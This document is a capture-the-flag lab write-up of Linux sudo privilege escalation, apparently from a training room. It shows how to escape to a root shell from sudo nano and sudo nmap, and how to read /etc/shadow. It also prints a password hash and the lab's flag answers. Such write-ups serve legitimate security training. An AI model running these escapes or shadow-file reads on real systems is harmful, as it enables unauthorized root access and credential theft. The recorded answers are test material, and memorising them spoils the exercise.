## Privilege Escalation SUDO Solution

### Notes: 
- A user may be given sudo privileges for specific applictions.
- Can use these programs to execute sudo commands
- Refer to [GTFO BINS](https://gtfobins.github.io/) for reference.
- Also check LD_PRELOAD exploit. 


### How many programs can the user "karen" run on the target system with sudo rights?

1. Execute `sudo -l`
   
![Screenshot 2024-02-11 at 11 15 17 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/5a3b1bfe-f69c-4db1-88de-cba61b76d9ea)

**Answer:3**

## What is the content of the flag2.txt file?

1. Let's go to [https://gtfobins.github.io/#+sudo](https://gtfobins.github.io/#+sudo).
   Based on the previous question above we have a sudo exploit for nano. [https://gtfobins.github.io/gtfobins/nano/#sudo](https://gtfobins.github.io/gtfobins/nano/#sudo)
   ```bash
   sudo nano
   ```
   The inside the nano editor execute the following:
   ```
   ^R^X
   reset; sh 1>&0 2>&0
   ```
   ![Screenshot 2024-02-11 at 11 20 48 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/2c17f326-2f34-44cb-899d-216da2d57b45)

2. We will have a terminal with root access within nano.
![Screenshot 2024-02-11 at 11 23 01 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/f7941a3e-b4c9-475b-b4e8-a4e92ceec0e0)

**Answer: THM-402028394** 

## How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?

1. Again go to [https://gtfobins.github.io/#+sudo](https://gtfobins.github.io/#+sudo), and lookup nmap.

**Answer: sudo nmap --interactive**
![Screenshot 2024-02-11 at 11 26 31 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/2e1d008b-a543-4af3-9b55-45981cfa4200)


## What is the hash of frank's password?

1. Execute the following command and look for frank's password hash. (still using the terminal inside nano).

```bash
cat /etc/shadow
```
![Screenshot 2024-02-11 at 11 31 06 PM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/eba5855f-fe5d-49d1-92a6-af04188fc6c1)


**Answer: $6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1**
